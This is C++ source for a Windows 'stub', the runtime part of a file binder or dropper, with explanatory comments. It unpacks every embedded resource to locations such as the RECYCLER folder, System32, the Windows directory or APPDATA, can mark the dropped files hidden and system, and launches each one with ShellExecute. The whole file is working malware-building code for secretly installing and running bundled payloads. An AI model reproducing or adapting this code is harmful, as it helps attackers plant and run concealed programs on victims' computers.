// Stub.cpp : Defines the entry point for the console application.
//

#include <Windows.h>
#include<Shlwapi.h>


//indicates to the linker that the Shlwapi.lib file is needed
#pragma comment(lib,"Shlwapi.lib")

//handler to application instance
HINSTANCE hinst = NULL;

 //stub tool allows set attributes Hidden & System  if this value is true 
//in my example  when  resource exist i want to set those attributes
bool bAttriubtes = false;


//buffer for  currently doing file's path 
char szRunPath[MAX_PATH] = "\0";

//handle to file 
HANDLE hFile = NULL;


//handle to (information about) resource
HRSRC hResInfo = NULL;

//pointer to data of read resource
HGLOBAL hData = NULL;

//variable  for  size of resource
DWORD dwSize = NULL;


//varaible for read/written data
//rights to read and write file
DWORD dwReadWritten = NULL;


//CALLBACK- defines function that  will be evoked inside another function and it gives access to data 
BOOL CALLBACK EnumResNameProc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG_PTR lParam)
{

	//if CURRENT directory exist take its path
	if (FindResource(hinst,(LPCTSTR)"CURRENT", RT_STRING) != NULL)
	{
		//first parameter-max length of the buffer
		//second-  pointer to the   buffer that receives current directory string 
		GetCurrentDirectory(MAX_PATH, (LPTSTR)szRunPath);

		lstrcat((LPTSTR)szRunPath,(LPTSTR)"\\");

		CharLower(lpszName);

		lstrcat((LPTSTR)szRunPath, lpszName);
	}


	//if RECYCLER resource exist take its path
	if (FindResource(hinst, (LPTSTR)"RECYCLER", RT_STRING) != NULL)
	{
		 //first parameter-pointer to the buffer that receives data
		//second parameter- max size of the buffer
		GetWindowsDirectory((LPTSTR)szRunPath, MAX_PATH);

		//removes all files and directories in path except for the root information
		PathStripToRoot((LPTSTR)szRunPath);

		//append name of directory
		lstrcat((LPTSTR)szRunPath, (LPTSTR)"RECYCLER\\");

		CharLower(lpszName);
		
		//append name of resource
		lstrcat((LPTSTR)szRunPath, lpszName);



	}
	if (FindResource(hinst,(LPTSTR) "WINDOWS", RT_STRING) != NULL)
	{
		GetWindowsDirectory((LPTSTR)szRunPath, MAX_PATH);
		lstrcat((LPTSTR)szRunPath, (LPTSTR)"\\");
		CharLower(lpszName);
		lstrcat((LPTSTR)szRunPath, lpszName);


	}

	if (FindResource(hinst, (LPTSTR)"SYSTEM32", RT_STRING) != NULL)
	{
		//first paramter-pointer to the buffer 
		//second- max length of the buffer
		GetSystemDirectory((LPTSTR)szRunPath, MAX_PATH);
		lstrcat((LPTSTR)szRunPath,(LPTSTR) "\\");
		CharLower(lpszName);
		lstrcat((LPTSTR)szRunPath, lpszName);

	}

	if (FindResource(hinst,(LPTSTR) "APPDATA", RT_STRING) != NULL)
	{
		//here we use _dupenv_s() to overview all environment's variables  to find given resource
		//first parametr-buffer where  i will put value of resource
		//second- size of the buffer
		//third- what resource i want to find 
		char *pAppData = new char[MAX_PATH];
		size_t len = 0;
		lstrcpy((LPTSTR)szRunPath,(LPTSTR) "\0");
		_dupenv_s(&pAppData, &len, "APPDATA");
		lstrcat((LPTSTR)szRunPath,(LPTSTR) pAppData);
		lstrcat((LPTSTR)szRunPath,(LPTSTR) "\\");
		CharLower(lpszName);
		lstrcat((LPTSTR)szRunPath, lpszName);

		// i don't want to use this table any more 
		delete[] pAppData;




		
	}


	//create file with given path and name
	//here i wil; write my resource
	hFile = CreateFile((LPTSTR)szRunPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{

		//find resource corresponded with given name 
		hResInfo = FindResource(hinst, lpszName, RT_RCDATA);
		hData = LoadResource(hinst, hResInfo);
		dwSize = SizeofResource(hinst, hResInfo);
	
	
		WriteFile(hFile, hData, dwSize, &dwReadWritten, 0);
		CloseHandle(hFile);
	}

	if (bAttriubtes == TRUE)
	{
		SetFileAttributes((LPTSTR)szRunPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	}

	//launch unpacked file (from resources)
	ShellExecute(NULL, (LPTSTR)"open",(LPTSTR) szRunPath, NULL, NULL, SW_SHOWDEFAULT);

	//take next files
	return true;



}





int WINAPI WinMain(HINSTANCE hIstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	hinst = GetModuleHandle(NULL);


	//to find single resource
	if (FindResource(hinst, (LPTSTR)"H_S", RT_STRING)!= NULL)
{
bAttriubtes = true;

}

	//to find all resources given type, we use EnumResourceNames()
	//third parameter-function will be evoke for all found resource given type 
	EnumResourceNames(hinst, RT_RCDATA, EnumResNameProc, 0);


	ExitProcess(0);

}


